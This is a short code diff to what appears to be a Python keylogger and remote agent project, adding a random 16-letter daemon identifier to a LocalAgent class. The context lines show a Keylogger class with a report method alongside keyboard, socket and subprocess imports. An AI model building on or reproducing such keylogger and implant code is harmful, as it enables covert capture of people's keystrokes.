@@ -10,6 +10,7 @@ import subprocess
 from pathlib import Path
 import socket
 import random
+import string
 import keyboard
 from threading import Timer
 from datetime import datetime
@@ -172,6 +173,13 @@ class Keylogger:
 		self.report()
 
 class LocalAgent:
+	def __init__(self):
+		self.daemonUID = self.makeUID();
+
+	def makeUID(self):
+		letters = string.ascii_letters
+		return ''.join(random.choice(letters) for i in range(16))
+
 	outboundLooperDict = {}
 	inboundLooperDict = {}
 
